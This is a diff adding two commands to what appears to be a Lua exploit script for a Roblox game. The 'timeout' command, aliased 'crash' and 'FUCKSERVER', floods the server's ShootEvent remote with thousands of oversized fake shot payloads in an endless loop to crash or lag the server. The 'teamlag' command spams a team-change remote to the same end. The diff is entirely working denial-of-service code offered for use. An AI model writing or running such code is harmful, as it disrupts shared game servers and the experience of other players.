@@ -973,6 +973,37 @@ add_command("punchrange", function(args, player)
 		pm_player(("set punchrange to %s"):format(args[2]), player);
 	end
 end, {aliases = {"pr"}})
+add_command("timeout", function(args, player)
+	local tool = get_item(nil, "Remington 870");
+
+	if tool then
+		local shoot_table = {};
+
+		for i = 1, 2000 do
+			table.insert(shoot_table, {
+				["RayObject"] = Ray.new();
+				["Distance"] = 2000;
+				["Cframe"] = cf();
+				["Hit"] = nil;
+			})
+		end
+
+		while true do
+			for i = 1, 5000 do
+				replicated_storage.ShootEvent:FireServer(shoot_table, tool);
+			end
+			replicated_storage.ReloadEvent:FireServer(tool);
+			task.wait(40)
+		end
+	end
+end, {aliases = {"crash", "disconnect", "FUCKSERVER", "delay"}})
+add_command("teamlag", function(args, player)
+	if args[2] and tonumber(args[2]) then
+		for i = 1, tonumber(args[2]) or 1 do
+			remote("Bright orange");
+		end
+	end
+end, {aliases = {"teamevent"}})
 
 
 -- toggles:
